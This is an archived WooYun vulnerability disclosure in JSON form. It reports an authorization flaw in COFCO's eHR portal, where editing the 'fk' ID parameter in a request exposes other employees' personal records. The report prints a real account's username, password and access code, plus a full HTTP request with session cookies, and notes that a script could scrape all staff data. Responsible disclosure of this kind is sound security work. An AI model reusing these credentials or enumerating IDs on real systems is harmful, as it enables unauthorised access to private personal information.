{"id": 46015, "wybug_id": "wooyun-2015-0133110", "wybug_title": "中粮某严重逻辑漏洞导致所有员工信息泄露", "wybug_corp": "中粮集团有限公司", "wybug_author": "路人甲", "wybug_date": "2015-08-10 16:28", "wybug_open_date": "2015-09-24 17:14", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-24：\t细节向公众公开  简要描述： 中粮某严重逻辑漏洞导致所有员工信息泄露 详细说明：  之前很久以前跑到一个弱口令帐号，因为工作太忙一直没有时间再进展，主要是自己懒。ehr.cofco.com用户名：leixingen 密码：leixingen123开放码：4256zx\n\n\nGET /datcllct/personInfoEditData.do?setId=A001&flag=1&fk=40095661&type=0 HTTP/1.1\nfk=40095661，我们修改成4095666试试\nGET /datcllct/personInfoEditData.do?setId=A001&flag=1&fk=40095666&type=0 HTTP/1.1Accept: application/x-ms-application, image/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, */*Referer: http://ehr.cofco.com/logonData.do#Accept-Language: zh-CNUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; GWX:RESERVED)Accept-Encoding: gzip, deflateHost: ehr.cofco.comProxy-Connection: Keep-AliveCookie: td_cookie=2530686; COFCO_C3_LOGIN=JOalhHAIjzZgUlJnDgE435SULZhJYuExh3C29ieLAeFY5Ai47cZ%2F2Y0gPfxYG4cV; COFCO_C3_JAVA=C0-AE-B7-B4-4C-8F-5C-5E-93-CD-44-D1-9F-EB-B7-09-72-23-4A-84-05-A0-3B-01-D9-58-58-E9-EF-85-AC-04-51-8B-13-66-73-B6-CA-14-30-16-79-93-9D-D7-6E-FF; JSESSIONID=VLcl2F3pZLZtyLFfR6Qkf2cTcLQ8NJh7zhXyFRBpd3dPzkytJ9GH!1040793581\n\n\n写个脚本，保存为html基本上可以把全员个人信息抓出来了，这个系统的信息还是比较全的，父母信息和学校之类的也会有。   漏洞证明：  之前很久以前跑到一个弱口令帐号，因为工作太忙一直没有时间再进展，主要是自己懒。ehr.cofco.com用户名：leixingen 密码：leixingen123开放码：4256zx\n\n\nGET /datcllct/personInfoEditData.do?setId=A001&flag=1&fk=40095661&type=0 HTTP/1.1\nfk=40095661，我们修改成4095666试试\nGET /datcllct/personInfoEditData.do?setId=A001&flag=1&fk=40095666&type=0 HTTP/1.1Accept: application/x-ms-application, image/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, */*Referer: http://ehr.cofco.com/logonData.do#Accept-Language: zh-CNUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; GWX:RESERVED)Accept-Encoding: gzip, deflateHost: ehr.cofco.comProxy-Connection: Keep-AliveCookie: td_cookie=2530686; COFCO_C3_LOGIN=JOalhHAIjzZgUlJnDgE435SULZhJYuExh3C29ieLAeFY5Ai47cZ%2F2Y0gPfxYG4cV; COFCO_C3_JAVA=C0-AE-B7-B4-4C-8F-5C-5E-93-CD-44-D1-9F-EB-B7-09-72-23-4A-84-05-A0-3B-01-D9-58-58-E9-EF-85-AC-04-51-8B-13-66-73-B6-CA-14-30-16-79-93-9D-D7-6E-FF; JSESSIONID=VLcl2F3pZLZtyLFfR6Qkf2cTcLQ8NJh7zhXyFRBpd3dPzkytJ9GH!1040793581\n\n\n写个脚本，保存为html基本上可以把全员个人信息抓出来了，这个系统的信息还是比较全的，父母信息和学校之类的也会有。   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-08-10 17:13 厂商回复： 非常感谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-10 17:39 |    \t\t路人毛 \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:10        | 昨晚做梦，挖到了电信都漏洞，被电信起诉了...)\t\t \n  我占个沙发再说    \n     2015-09-24 21:47 |    \t\t老实先生 \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:4        | 早日告别路人状态)\t\t \n  leixingen123      这也叫弱口令？？？？？？    \n     2015-09-24 23:18 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:157        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  @老实先生 用户名后面123= =不叫弱口令叫什么~！    \n     2015-09-24 23:32 |    \t\tsOnsec \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:24        | 安全是什么...)\t\t \n  20 洞主 你赚了啊    \n     2015-09-25 07:08 |    \t\t老实先生 \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:4        | 早日告别路人状态)\t\t \n  @_Thorns\tsorry    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}